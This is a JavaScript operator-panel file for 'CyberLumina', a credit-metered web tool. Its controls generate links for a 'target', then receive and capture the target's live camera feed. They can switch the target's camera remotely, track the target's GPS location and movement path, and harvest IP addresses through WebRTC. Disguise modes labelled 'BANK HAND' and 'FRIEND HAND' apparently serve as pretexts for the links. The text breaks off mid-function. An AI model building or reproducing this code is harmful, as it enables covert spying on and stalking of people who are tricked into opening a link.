// ===== CyberLumina APP.JS =====

// ---- CREDIT SYSTEM ----
async function deductCredit(feature) {
  try {
    const fd = new FormData();
    fd.append('action', 'deduct_credit');
    fd.append('feature', feature);
    const r = await fetch('credits.php', {   // dedicated endpoint — no extra output
      method: 'POST',
      body: fd,
      credentials: 'include'
    });

    // Guard: non-JSON response
    const text = await r.text();
    let d;
    try { d = JSON.parse(text); }
    catch(e) {
      _showCreditErr('Server error — please try again.');
      return false; // FAIL-CLOSED
    }

    if (d.success) {
      updateCreditDisplay(d.credits);
      if (d.auto_signout || d.credits <= 0) {
        triggerCreditExhausted();
        return false;
      }
      return true; // ✅ credit deducted OK

    } else if (d.error === 'insufficient_credits') {
      updateCreditDisplay(d.credits);
      triggerCreditExhausted();
      return false;

    } else if (d.error === 'Not logged in') {
      _showCreditErr('Session expired — please log in again.');
      setTimeout(() => window.location.href = 'login.php', 2000);
      return false; // FAIL-CLOSED

    } else {
      // Unknown feature, DB error, etc.
      _showCreditErr('Credit check failed: ' + (d.error || 'Unknown error'));
      return false; // FAIL-CLOSED — never allow without deduction
    }
  } catch(e) {
    _showCreditErr('Network error — could not verify credits.');
    return false; // FAIL-CLOSED on network failure
  }
}

// Show a small red error banner
function _showCreditErr(msg) {
  const old = document.querySelector('.credit-err-toast');
  if (old) old.remove();
  const t = document.createElement('div');
  t.className = 'credit-err-toast';
  t.style.cssText = 'position:fixed;top:72px;right:1.2rem;z-index:99999;'
    + 'padding:.7rem 1.1rem;background:rgba(239,68,68,.14);'
    + 'border:1px solid rgba(239,68,68,.4);border-radius:10px;'
    + 'color:#ff6688;font-size:.8rem;font-family:"Share Tech Mono",monospace;'
    + 'box-shadow:0 6px 20px rgba(0,0,0,.4);animation:slideIn .25s ease;';
  t.textContent = '❌ ' + msg;
  document.body.appendChild(t);
  setTimeout(() => { t.style.opacity='0'; t.style.transition='opacity .4s'; }, 3000);
  setTimeout(() => t.remove(), 3500);
}

function updateCreditDisplay(credits) {
  const bal   = document.getElementById('credit-balance');
  const pdVal = document.getElementById('pd-credit-val');
  const badge = document.getElementById('nav-credits');
  if (bal)   bal.textContent   = credits;
  if (pdVal) pdVal.textContent = credits;
  if (badge) {
    badge.classList.remove('credit-low','credit-empty');
    if (credits === 0)      badge.classList.add('credit-empty');
    else if (credits <= 20) badge.classList.add('credit-low');
  }
}

function showCreditToast() {
  const old = document.querySelector('.credit-toast');
  if (old) old.remove();
  const t = document.createElement('div');
  t.className = 'credit-toast';
  t.innerHTML = '⚡ Insufficient credits! You cannot generate more links.';
  document.body.appendChild(t);
  setTimeout(() => t.style.opacity = '0', 2500);
  setTimeout(() => t.remove(), 2900);
}

function lockAllFeatures() {
  // Disable all generate-link buttons
  ['btn-gen-link','btn-gen-loc','btn-gen-ip-link','btn-gen-gallery-link',
   'btn-start-cam','btn-capture','btn-stop-cam'].forEach(id => {
    const el = document.getElementById(id);
    if (el) { el.disabled = true; el.style.opacity = '0.3'; }
  });
  // Show full-page lock overlay with Upgrade option
  let overlay = document.getElementById('credit-lock-overlay');
  if (overlay) return; // already shown
  overlay = document.createElement('div');
  overlay.id = 'credit-lock-overlay';
  overlay.style.cssText = [
    'position:fixed;inset:0;z-index:99999;',
    'background:rgba(3,10,15,.97);',
    'display:flex;flex-direction:column;align-items:center;justify-content:center;gap:1.25rem;',
    'backdrop-filter:blur(16px);font-family:Inter,sans-serif;'
  ].join('');
  overlay.innerHTML = `
    <div style="font-size:3.5rem;animation:pulse 2s ease-in-out infinite">⚡</div>
    <h2 style="font-family:'Orbitron',monospace;color:#ff2244;font-size:2rem;letter-spacing:.08em;text-align:center">
      CREDITS EXHAUSTED
    </h2>
    <p style="color:#8892b0;font-size:.9rem;text-align:center;max-width:400px;line-height:1.8;padding:0 1rem">
      Your credit balance is <strong style="color:#ff2244">0</strong>.<br>
      Each email account gets <strong style="color:#00f0ff">100 free credits</strong> — one time only.<br>
      Upgrade your plan to continue using all features.
    </p>
    <div style="display:flex;flex-direction:column;gap:.75rem;width:100%;max-width:320px;padding:0 1.5rem">
      <a href="plans.php" style="
        display:block;text-align:center;padding:.85rem;border-radius:12px;
        background:linear-gradient(135deg,#00f0ff,#7b2fff);color:#fff;
        font-family:'Orbitron',monospace;font-size:.85rem;font-weight:700;
        letter-spacing:.05em;text-decoration:none;
        box-shadow:0 8px 30px rgba(0,240,255,.25);
        transition:transform .2s;">
        🚀 Upgrade to Pro
      </a>
      <button onclick="window.location.href='auth.php?action=logout'" style="
        display:block;width:100%;padding:.7rem;border-radius:12px;
        background:transparent;border:1px solid rgba(255,255,255,.1);
        color:#5a7a8a;font-size:.82rem;cursor:pointer;
        font-family:'Inter',sans-serif;transition:all .2s;">
        Sign Out
      </button>
    </div>
    <p style="color:#2a4a5a;font-size:.72rem;font-family:'Share Tech Mono',monospace">
      cyberlumina.kesug.com • Credits System
    </p>
  `;
  document.body.appendChild(overlay);
  // Pulse animation
  const style = document.createElement('style');
  style.textContent = '@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.2)}}';
  document.head.appendChild(style);
}

function triggerCreditExhausted() {
  updateCreditDisplay(0);
  lockAllFeatures();
}

// On page load: if credits already 0 → lock immediately
(function() {
  const bal = document.getElementById('credit-balance');
  if (bal) {
    const credits = parseInt(bal.textContent) || 0;
    updateCreditDisplay(credits);
    if (credits <= 0) {
      // Small delay so page renders first
      setTimeout(triggerCreditExhausted, 500);
    }
  }
})();

// ---- GLOBAL STATE ----
let currentMode = 'bank';
let stream = null;
let facingMode = 'user';
let captureCount = 0;
let capturedImages = [];
let galleryFiles = [];
let currentFilter = 'all';
let currentView = 'grid';
let locationWatcher = null;
let autoCapture = null;
let lastLBUrl = '';
let hostPeer = null;
let camRawLink = '';
let remoteDataConn = null;   // data channel to/from target
let remoteCall = null;       // active video call from target
let isRemoteStream = false;  // true when showing target's camera
let locMap = null;
let locMarker = null;
let pathPolyline = null;
let locationHistory = [];
let _lastLocKey = null; // dedup key for location history
let totalDistance = 0;

// ---- MATRIX RAIN ----
const canvas = document.getElementById('matrix-canvas');
const ctx = canvas.getContext('2d');
let cols = 0, drops = [];
const chars = 'CYBERLUMINAアイウエオカキクケコサシスセソタチツテトナニヌネノ0123456789ABCDEF';

function initMatrix() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  cols = Math.floor(canvas.width / 18);
  drops = Array(cols).fill(1);
}
function drawMatrix() {
  ctx.fillStyle = 'rgba(3,10,15,0.05)';
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = '#00f0ff';
  ctx.font = '13px Share Tech Mono';
  for (let i = 0; i < drops.length; i++) {
    const char = chars[Math.floor(Math.random() * chars.length)];
    ctx.fillText(char, i * 18, drops[i] * 18);
    if (drops[i] * 18 > canvas.height && Math.random() > 0.975) drops[i] = 0;
    drops[i]++;
  }
}
initMatrix();
setInterval(drawMatrix, 60);
window.addEventListener('resize', initMatrix);

// ---- CLOCK ----
function updateClock() {
  const el = document.getElementById('cam-clock');
  if (el) el.textContent = new Date().toLocaleTimeString();
}
setInterval(updateClock, 1000);
updateClock();

// ---- NAV TABS ----
const navToggle = document.getElementById('nav-toggle');
const navLinksContainer = document.getElementById('nav-links');

if (navToggle) {
  navToggle.addEventListener('click', () => {
    navToggle.classList.toggle('active');
    navLinksContainer.classList.toggle('open');
  });
}

document.querySelectorAll('.nav-link').forEach(link => {
  link.addEventListener('click', e => {
    e.preventDefault();
    const tab = link.getAttribute('data-tab');
    document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
    link.classList.add('active');
    document.querySelectorAll('.tab-section').forEach(s => s.classList.remove('active'));
    document.getElementById('tab-' + tab).classList.add('active');
    
    // Close mobile menu on click
    if (navLinksContainer.classList.contains('open')) {
      navLinksContainer.classList.remove('open');
      navToggle.classList.remove('active');
    }
  });
});

// ---- MODE SWITCH ----
function setMode(mode) {
  currentMode = mode;
  const label = mode === 'bank' ? 'BANK HAND' : 'FRIEND HAND';
  document.getElementById('mode-bank').classList.toggle('active', mode === 'bank');
  document.getElementById('mode-friend').classList.toggle('active', mode === 'friend');
  document.querySelector('#mode-label span').textContent = label;
  ['cam-mode-label','info-mode','loc-mode-tag','ip-mode-tag','gallery-mode-tag'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.textContent = label;
  });
}

// ===== WEBCAM =====
async function startCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    const video = document.getElementById('webcam-video');
    video.srcObject = stream;
    video.style.display = 'block';
    document.getElementById('cam-overlay').style.display = 'none';
    document.getElementById('scan-line').style.display = 'block';
    document.getElementById('btn-start-cam').disabled = true;
    document.getElementById('btn-stop-cam').disabled = false;
    document.getElementById('btn-capture').disabled = false;
    document.getElementById('btn-switch-cam').disabled = false;
    document.getElementById('info-status').textContent = 'LIVE';
    document.getElementById('info-status').className = 'tag tag-green';
    const track = stream.getVideoTracks()[0];
    const settings = track.getSettings();
    document.getElementById('info-res').textContent = `${settings.width || 1280}×${settings.height || 720}`;
    document.getElementById('info-fps').textContent = (settings.frameRate || 30) + ' fps';
  } catch (err) {
    alert('Camera access denied or unavailable: ' + err.message);
  }
}

function stopCamera() {
  // If showing remote stream — disconnect the target
  if (isRemoteStream) {
    if (remoteDataConn && remoteDataConn.open) {
      try { remoteDataConn.send(JSON.stringify({ type: 'disconnect' })); } catch(e) {}
    }
    setTimeout(function() {
      if (hostPeer) { hostPeer.destroy(); hostPeer = null; }
      remoteDataConn = null;
      remoteCall = null;
      isRemoteStream = false;
    }, 500);
    // Reset video UI
    const video = document.getElementById('webcam-video');
    video.srcObject = null;
    video.style.transform = 'scaleX(-1)';
    document.getElementById('cam-overlay').style.display = 'flex';
    document.getElementById('scan-line').style.display = 'none';
    document.getElementById('info-status').textContent = 'OFFLINE';
    document.getElementById('info-status').className = 'tag tag-red';
    document.getElementById('info-res').textContent = '—';
    document.getElementById('info-fps').textContent = '—';
    document.getElementById('btn-capture').disabled = true;
    setPeerDot('offline', 'DISCONNECTED');
    setRemoteStatus('Connection closed.', '');
    return;
  }
  // Own camera mode
  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
  const video = document.getElementById('webcam-video');
  video.srcObject = null;
  document.getElementById('cam-overlay').style.display = 'flex';
  document.getElementById('scan-line').style.display = 'none';
  document.getElementById('btn-start-cam').disabled = false;
  document.getElementById('btn-stop-cam').disabled = true;
  document.getElementById('btn-capture').disabled = true;
  document.getElementById('btn-switch-cam').disabled = true;
  document.getElementById('info-status').textContent = 'OFFLINE';
  document.getElementById('info-status').className = 'tag tag-red';
  document.getElementById('info-res').textContent = '—';
  document.getElementById('info-fps').textContent = '—';
  if (autoCapture) { clearInterval(autoCapture); autoCapture = null; }
}

async function capturePhoto() {
  const video = document.getElementById('webcam-video');

  // ── Guard: video must be playing and have real frame data ──
  if (!video || video.readyState < 2 || video.videoWidth === 0 || video.videoHeight === 0) {
    const hint = isRemoteStream
      ? '⚠️ Remote stream not ready yet — wait a moment and try again.'
      : '⚠️ Camera not ready — start the camera first.';
    setRemoteStatus(hint, 'waiting');
    return;
  }

  const c = document.getElementById('webcam-canvas');
  c.width  = video.videoWidth;
  c.height = video.videoHeight;
  const cx = c.getContext('2d');

  cx.save();
  if (!isRemoteStream && document.getElementById('mirror-toggle').checked) {
    cx.translate(c.width, 0);
    cx.scale(-1, 1);
  }
  cx.drawImage(video, 0, 0, c.width, c.height);
  cx.restore();

  const dataURL = c.toDataURL('image/jpeg', 0.9);
  capturedImages.unshift(dataURL);
  captureCount++;
  document.getElementById('info-captures').textContent = captureCount;
  addCaptureToList(dataURL);
}

function updateMiniPreview(url) {
  // Legacy — kept for compatibility, real display in addCaptureToList
}

function addCaptureToList(url) {
  // Timestamp
  const now      = new Date();
  const time     = now.toLocaleTimeString('en-GB', { hour:'2-digit', minute:'2-digit', second:'2-digit' });
  const date     = now.toLocaleDateString('en-GB', { day:'2-digit', month:'short' });

  // ── Add to visual grid panel (primary display) ──
  addToRemoteGrid(url, captureCount, time, date);
}

function downloadOne(url, timeStr) {
  const a = document.createElement('a');
  a.href = url;
  a.download = `cyberlumina_${timeStr}.jpg`;
  a.click();
}

function downloadAllCaptures() {
  if (!capturedImages.length) return;
  capturedImages.forEach((url, i) => {
    setTimeout(() => {
      const a = document.createElement('a');
      a.href = url;
      a.download = `cyberlumina_capture_${i + 1}.jpg`;
      a.click();
    }, i * 400); // stagger downloads
  });
}

// Legacy alias
function downloadCapture() { downloadAllCaptures(); }

// ===== REMOTE CAPTURES LIGHTBOX =====
let rcLightboxUrl = '';
let currentLbIndex = 0;  // current index in capturedImages[]
let lbZoomLevel = 1;     // current zoom multiplier

function openRcLightbox(url, num, dateStr, timeStr) {
  // Find index in capturedImages for navigation
  currentLbIndex = capturedImages.indexOf(url);
  if (currentLbIndex === -1) currentLbIndex = 0;
  _renderLightbox(currentLbIndex);
  const lb = document.getElementById('rc-lightbox');
  lb.style.display = 'flex';
  document.body.style.overflow = 'hidden';
}

function _renderLightbox(idx) {
  if (!capturedImages.length) return;
  idx = Math.max(0, Math.min(idx, capturedImages.length - 1));
  currentLbIndex = idx;
  rcLightboxUrl = capturedImages[idx];
  lbZoomLevel = 1; // reset zoom on navigation

  const img = document.getElementById('rc-lb-img');
  img.src = rcLightboxUrl;
  img.style.transform = 'scale(1)';
  img.style.cursor = 'zoom-in';

  // Show counter
  const counter = document.getElementById('rc-lb-counter');
  if (counter) counter.textContent = (capturedImages.length - idx) + ' / ' + capturedImages.length;

  // Show basic info immediately
  const infoEl = document.getElementById('rc-lb-info');
  if (infoEl) infoEl.textContent = '📸 #' + (capturedImages.length - idx);

  // Show resolution once image loads
  img.onload = function() {
    const resEl = document.getElementById('rc-lb-res');
    if (resEl && img.naturalWidth) {
      resEl.textContent = img.naturalWidth + ' × ' + img.naturalHeight + ' px';
    }
  };

  // Show/hide nav arrows
  const prev = document.getElementById('rc-lb-prev');
  const next = document.getElementById('rc-lb-next');
  if (prev) prev.style.opacity = idx < capturedImages.length - 1 ? '1' : '0.2';
  if (next) next.style.opacity = idx > 0 ? '1' : '0.2';
}

function rcLbNav(dir) {
  // dir: -1 = prev (older), +1 = next (newer)
  _renderLightbox(currentLbIndex - dir);
}

function rcLbZoom(dir) {
  const img = document.getElementById('rc-lb-img');
  if (!img) return;
  if (dir === 0) {
    lbZoomLevel = 1;
    img.style.cursor = 'zoom-in';
  } else {
    lbZoomLevel = Math.min(Math.max(lbZoomLevel + dir * 0.5, 0.5), 5);
    img.style.cursor = lbZoomLevel > 1 ? 'zoom-out' : 'zoom-in';
  }
  img.style.transform = 'scale(' + lbZoomLevel + ')';
}

function closeRcLightbox() {
  document.getElementById('rc-lightbox').style.display = 'none';
  document.body.style.overflow = '';
  lbZoomLevel = 1;
  const img = document.getElementById('rc-lb-img');
  if (img) { img.style.transform = 'scale(1)'; img.src = ''; }
}

function rcLightboxDownload() {
  if (!rcLightboxUrl) return;
  const a = document.createElement('a');
  a.href = rcLightboxUrl;
  a.download = 'cyberlumina_capture_' + Date.now() + '.jpg';
  a.click();
}

// Keyboard navigation for lightbox
document.addEventListener('keydown', function(e) {
  const lb = document.getElementById('rc-lightbox');
  if (!lb || lb.style.display === 'none') return;
  if (e.key === 'Escape')      closeRcLightbox();
  else if (e.key === 'ArrowLeft')  rcLbNav(-1);
  else if (e.key === 'ArrowRight') rcLbNav(1);
  else if (e.key === '+')          rcLbZoom(1);
  else if (e.key === '-')          rcLbZoom(-1);
});

function addToRemoteGrid(url, num, timeStr, dateStr) {
  const panel = document.getElementById('remote-captures-panel');
  const grid  = document.getElementById('rc-grid');
  if (!panel || !grid) return;

  // Hide empty placeholder on first capture
  const empty = document.getElementById('rc-empty');
  if (empty) empty.style.display = 'none';

  // Badge update
  const badge = document.getElementById('rc-badge');
  if (badge) badge.textContent = captureCount + ' photo' + (captureCount !== 1 ? 's' : '');

  // ── Card wrapper ──
  const card = document.createElement('div');
  card.style.cssText = 'position:relative;border-radius:10px;overflow:hidden;' +
    'border:1px solid rgba(0,240,255,.15);cursor:pointer;' +
    'background:#061018;animation:fadeIn .35s ease;' +
    'aspect-ratio:4/3;';  // uniform grid cells

  // ── Thumbnail image — object-fit:contain = no crop, full photo visible ──
  const img = document.createElement('img');
  img.src = url;
  img.alt = 'cap';
  img.style.cssText = 'width:100%;height:100%;object-fit:contain;display:block;' +
    'transition:transform .25s;background:#030a0f;';
  img.addEventListener('click', function() { openRcLightbox(url, num, dateStr, timeStr); });

  // ── Hover overlay (download + number) ──
  const overlay = document.createElement('div');
  overlay.style.cssText = 'position:absolute;inset:0;background:rgba(0,0,0,.55);' +
    'display:flex;flex-direction:column;align-items:center;justify-content:center;' +
    'gap:.35rem;opacity:0;transition:opacity .2s;pointer-events:none;';

  const numBadge = document.createElement('span');
  numBadge.style.cssText = 'font-size:.65rem;color:#00f0ff;font-weight:700;' +
    'background:rgba(0,0,0,.6);padding:.1rem .4rem;border-radius:10px;';
  numBadge.textContent = '📸 #' + num;

  const dlBtn = document.createElement('button');
  dlBtn.textContent = '⬇ Download';
  dlBtn.style.cssText = 'background:#00f0ff;color:#000;border:none;border-radius:6px;' +
    'padding:.3rem .6rem;font-size:.68rem;font-weight:700;cursor:pointer;pointer-events:all;';
  dlBtn.addEventListener('click', function(e) {
    e.stopPropagation();
    downloadOne(url, timeStr.replace(/:/g,'-'));
  });

  overlay.appendChild(numBadge);
  overlay.appendChild(dlBtn);

  // ── Timestamp bar ──
  const bar = document.createElement('div');
  bar.style.cssText = 'position:absolute;bottom:0;left:0;right:0;' +
    'background:rgba(0,0,0,.65);padding:.2rem .4rem;' +
    'font-size:.6rem;color:#aaa;text-align:center;';
  bar.textContent = dateStr + ' · ' + timeStr;

  // ── Hover events ──
  card.addEventListener('mouseenter', function() {
    overlay.style.opacity = '1';
    img.style.transform = 'scale(1.04)';
  });
  card.addEventListener('mouseleave', function() {
    overlay.style.opacity = '0';
    img.style.transform = 'scale(1)';
  });

  card.appendChild(img);
  card.appendChild(overlay);
  card.appendChild(bar);
  grid.prepend(card); // newest first
}


function clearRemoteCaptures() {
  capturedImages = [];
  captureCount   = 0;
  document.getElementById('info-captures').textContent = '0';
  const grid = document.getElementById('rc-grid');
  if (grid) grid.innerHTML = '';
  const empty = document.getElementById('rc-empty');
  if (empty) empty.style.display = 'block';
  const badge = document.getElementById('rc-badge');
  if (badge) badge.textContent = '0 photos';
}

// Test function — injects a fake capture to verify the panel UI works
function testCapture() {
  const c = document.createElement('canvas');
  c.width = 480; c.height = 360;
  const ctx = c.getContext('2d');
  // Draw a gradient placeholder
  const grad = ctx.createLinearGradient(0, 0, 480, 360);
  grad.addColorStop(0, '#0a1a24');
  grad.addColorStop(0.5, '#00f0ff33');
  grad.addColorStop(1, '#7b2fff44');
  ctx.fillStyle = grad;
  ctx.fillRect(0, 0, 480, 360);
  // Draw text
  ctx.fillStyle = '#00f0ff';
  ctx.font = 'bold 22px monospace';
  ctx.textAlign = 'center';
  ctx.fillText('📸 TEST CAPTURE', 240, 160);
  ctx.font = '14px monospace';
  ctx.fillStyle = '#aaa';
  ctx.fillText(new Date().toLocaleTimeString(), 240, 190);
  // Inject as capture
  const url = c.toDataURL('image/jpeg', 0.8);
  capturedImages.unshift(url);
  captureCount++;
  document.getElementById('info-captures').textContent = captureCount;
  addCaptureToList(url);
}

async function switchCamera() {
  // Case 1: Remote stream active — switch TARGET's camera
  if (isRemoteStream && remoteDataConn && remoteDataConn.open) {
    try {
      remoteDataConn.send(JSON.stringify({ type: 'switch_camera' }));
      document.getElementById('btn-switch-cam').textContent = '⏳ Switching...';
      setTimeout(() => {
        document.getElementById('btn-switch-cam').textContent = '🔄 Switch Cam';
      }, 2000);
      setRemoteStatus('🔄 Camera switch command sent to target...', 'waiting');
    } catch(e) {
      setRemoteStatus('❌ Switch failed — target may have disconnected.', '');
    }
    return;
  }
  // Case 2: Own local camera active — switch facing mode
  if (stream) {
    facingMode = facingMode === 'user' ? 'environment' : 'user';
    stopCamera();
    await startCamera();
    return;
  }
  // Case 3: No stream — show helpful message
  setRemoteStatus('⚠️ Generate a link and wait for target to connect, or click Start Camera first.', 'waiting');
}

function toggleMirror() {
  const video = document.getElementById('webcam-video');
  const checked = document.getElementById('mirror-toggle').checked;
  video.style.transform = checked ? 'scaleX(-1)' : 'scaleX(1)';
}

function toggleScan() {
  const line = document.getElementById('scan-line');
  line.style.display = document.getElementById('scan-toggle').checked && stream ? 'block' : 'none';
}

function toggleAuto() {
  if (document.getElementById('auto-toggle').checked) {
    if (stream) autoCapture = setInterval(capturePhoto, 5000);
  } else {
    if (autoCapture) { clearInterval(autoCapture); autoCapture = null; }
  }
}

// ===== LOCATION =====
function getLocation() {
  if (!locPeer) {
    setLocStatus('⚠️ Generate a link and send it to the target first.');
    return;
  }
  setLocStatus('⏳ Awaiting GPS signal from target...');
  document.getElementById('map-status-tag').textContent = 'LISTENING';
}

function trackLocation() {
  if (!locPeer) {
    setLocStatus('⚠️ Generate a link and send it to the target first.');
    return;
  }
  setLocStatus('🔄 Waiting for target to connect for live tracking...');
  document.getElementById('map-status-tag').textContent = 'LISTENING';
}

async function onLocSuccess(pos) {
  const { latitude, longitude, accuracy, altitude, speed } = pos.coords;
  document.getElementById('lat-val').textContent = latitude.toFixed(6) + '°';
  document.getElementById('lon-val').textContent = longitude.toFixed(6) + '°';
  document.getElementById('acc-val').textContent = Math.round(accuracy) + ' m';
  document.getElementById('alt-val').textContent = altitude ? Math.round(altitude) + ' m' : 'N/A';
  document.getElementById('loc-speed').textContent = speed ? (speed * 3.6).toFixed(1) + ' km/h' : 'N/A';
  document.getElementById('loc-tz').textContent = Intl.DateTimeFormat().resolvedOptions().timeZone;
  setLocStatus('✅ Location acquired successfully');
  document.getElementById('map-status-tag').textContent = 'LOCKED';
  document.getElementById('map-msg').textContent = `${latitude.toFixed(4)}, ${longitude.toFixed(4)}`;
  // Fetch city/country
  fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`)
    .then(r => r.json()).then(d => {
      document.getElementById('loc-city').textContent = d.address?.city || d.address?.town || d.address?.village || '—';
      document.getElementById('loc-country').textContent = d.address?.country || '—';
    }).catch(() => {});
  // Add to history
  addLocHistory(latitude, longitude);
  updateMap(latitude, longitude);
}

function onLocError(err) {
  setLocStatus('❌ Error: ' + err.message);
  document.getElementById('map-status-tag').textContent = 'FAILED';
}

function updateMap(lat, lon) {
  const mapFrame = document.getElementById('map-frame');
  if (!mapFrame) return;

  const grid = mapFrame.querySelector('.map-grid');
  const crosshair = mapFrame.querySelector('.map-crosshair');
  const msg = mapFrame.querySelector('.map-msg');
  if (grid) grid.style.display = 'none';
  if (crosshair) crosshair.style.display = 'none';
  if (msg) msg.style.display = 'none';

  if (!locMap) {
    locMap = L.map('map-frame', { zoomControl: false }).setView([lat, lon], 15);
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
      attribution: '&copy; OpenStreetMap',
      subdomains: 'abcd',
      maxZoom: 20
    }).addTo(locMap);

    const icon = L.divIcon({
      className: 'custom-map-marker',
      html: '<div style="width:16px;height:16px;background:#00f0ff;border-radius:50%;box-shadow:0 0 10px #00f0ff;border:2px solid #fff;"></div>',
      iconSize: [16, 16],
      iconAnchor: [8, 8]
    });
    locMarker = L.marker([lat, lon], {icon}).addTo(locMap);

    // Initialize path polyline for tracking movement
    pathPolyline = L.polyline([], {
      color: '#00f0ff',
      weight: 4,
      opacity: 0.8,
      dashArray: '10, 10',
      lineCap: 'round'
    }).addTo(locMap);

    // Fix Leaflet invalid size issues
    setTimeout(() => { locMap.invalidateSize(); }, 300);
  } else {
    locMap.setView([lat, lon], 15);
    locMarker.setLatLng([lat, lon]);
  }

  // Add point to path history — only if moved >10m from last point
  const lastHist = locationHistory[locationHistory.length - 1];
  const moved = !lastHist ||
    Math.abs(lat - lastHist.lat) > 0.0001 ||
    Math.abs(lon - lastHist.lon) > 0.0001;

  if (moved) {
    locationHistory.push({ lat, lon, time: new Date() });
    // Calculate distance from last point
    if (locationHistory.length > 1) {
      const prev = locationHistory[locationHistory.length - 2];
      const dist = calculateDistance(prev.lat, prev.lon, lat, lon);
      totalDistance += dist;
      updateDistanceDisplay();
    }
    // Update polyline
    const pathCoords = locationHistory.map(p => [p.lat, p.lon]);
    pathPolyline.setLatLngs(pathCoords);
  }
}

function calculateDistance(lat1, lon1, lat2, lon2) {
  const R = 6371; // Earth's radius in km
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
            Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
            Math.sin(dLon/2) * Math.sin(dLon/2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
  return R * c;
}

function updateDistanceDisplay() {
  let distDisplay = document.getElementById('total-distance');
  if (!distDisplay) {
    // Create distance display if it doesn't exist
    const statsRow = document.querySelector('.coords-grid');
    if (statsRow) {
      const distBox = document.createElement('div');
      distBox.className = 'coord-box';
      distBox.id = 'distance-box';
      distBox.innerHTML = '<label>Total Distance</label><div class="coord-value" id="total-distance">0.00 km</div>';
      statsRow.appendChild(distBox);
    }
    distDisplay = document.getElementById('total-distance');
  }
  if (distDisplay) {
    distDisplay.textContent = totalDistance.toFixed(2) + ' km';
  }
}

function clearPathHistory() {
  locationHistory = [];
  totalDistance = 0;
  if (pathPolyline) pathPolyline.setLatLngs([]);
  updateDistanceDisplay();
  updatePathStats();
  
  // Clear the UI list as well
  const container = document.getElementById('loc-history');
  if (container) {
    container.innerHTML = '<div class="history-title">📜 Location History</div><div class="history-empty">No records yet</div>';
  }
  
  setLocStatus('🔄 Path history cleared');
}

function updatePathStats() {
  const statsPanel = document.getElementById('path-stats');
  if (locationHistory.length > 0 && statsPanel) {
    statsPanel.style.display = 'flex';
    document.getElementById('points-count').textContent = locationHistory.length;

    // Calculate tracking time
    if (locationHistory.length > 1) {
      const startTime = locationHistory[0].time;
      const endTime = locationHistory[locationHistory.length - 1].time;
      const diffMs = endTime - startTime;
      const mins = Math.floor(diffMs / 60000);
      const secs = Math.floor((diffMs % 60000) / 1000);
      document.getElementById('track-time').textContent =
        String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');

      // Calculate average speed
      if (totalDistance > 0 && diffMs > 0) {
        const hours = diffMs / 3600000;
        const avgSpeed = totalDistance / hours;
        document.getElementById('avg-speed').textContent = avgSpeed.toFixed(1) + ' km/h';
      }
    }
  } else if (statsPanel) {
    // Reset stats if history is empty
    document.getElementById('points-count').textContent = '0';
    document.getElementById('track-time').textContent = '00:00';
    document.getElementById('avg-speed').textContent = '0 km/h';
  }
}

// Update path stats every second when tracking
setInterval(() => {
  if (locationHistory.length > 0) {
    updatePathStats();
  }
}, 1000);

function setLocStatus(msg) { document.getElementById('loc-status').textContent = msg; }

function copyCoords() {
  const lat = document.getElementById('lat-val').textContent;
  const lon = document.getElementById('lon-val').textContent;
  if (lat === '—') return;
  navigator.clipboard.writeText(`${lat}, ${lon}`).then(() => setLocStatus('📋 Coordinates copied!'));
}

function openMaps() {
  const lat = document.getElementById('lat-val').textContent.replace('°','');
  const lon = document.getElementById('lon-val').textContent.replace('°','');
  if (lat === '—') return;
  window.open(`https://www.google.com/maps?q=${lat},${lon}`, '_blank');
}

function addLocHistory(lat, lon) {
  // Dedup: skip if same position (<10m movement)
  const key = lat.toFixed(4) + ',' + lon.toFixed(4);
  if (key === _lastLocKey) return;
  _lastLocKey = key;

  const container = document.getElementById('loc-history');
  if (!container) return;
  const empty = container.querySelector('.history-empty');
  if (empty) empty.remove();

  const count = container.querySelectorAll('.history-item').length + 1;
  const item = document.createElement('div');
  item.className = 'history-item';
  item.textContent = `${count}. [${new Date().toLocaleTimeString()}] ${lat.toFixed(4)}, ${lon.toFixed(4)}`;
  container.appendChild(item);
  // Auto-scroll to latest
  container.scrollTop = container.scrollHeight;
}

// ── Toggle IP Sections ──
function toggleIpSection(element) {
  element.classList.toggle('collapsed');
  const nextGrid = element.nextElementSibling;
  if (nextGrid && nextGrid.classList.contains('ip-grid')) {
    nextGrid.classList.toggle('collapsed-content');
  }
}

// ── Is IP private/local? (RFC1918 + loopback + link-local) ──
function _isPrivateIP(ip) {
  if (!ip) return false;
  // IPv4 private ranges
  if (/^(10\.|127\.|169\.254\.|192\.168\.)/.test(ip)) return true;
  if (/^172\.(1[6-9]|2[0-9]|3[01])\./.test(ip)) return true;
  // IPv6 loopback / link-local / ULA
  if (/^(::1$|fe80:|fc[0-9a-f]{2}:|fd[0-9a-f]{2}:)/i.test(ip)) return true;
  return false;
}

// ── Get local / private IP via WebRTC (captures both IPv4 + IPv6) ──
function _getPrivateIP() {
  return new Promise(resolve => {
    try {
      const pc = new RTCPeerConnection({
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' }
        ]
      });
      pc.createDataChannel('');
      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => resolve(null));
      const ipv4s = [], ipv6s = [];
      pc.onicecandidate = e => {
        if (!e || !e.candidate) {
          try { pc.close(); } catch(_) {}
          const parts = [];
          if (ipv4s.length) parts.push(ipv4s.join('\n'));
          if (ipv6s.length) parts.push(ipv6s.join('\n'));
          resolve(parts.length ? parts.join('\n') : null);
          return;
        }
        const cand = e.candidate.candidate;
        // Match IPv4 — private only
        const m4 = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})/.exec(cand);
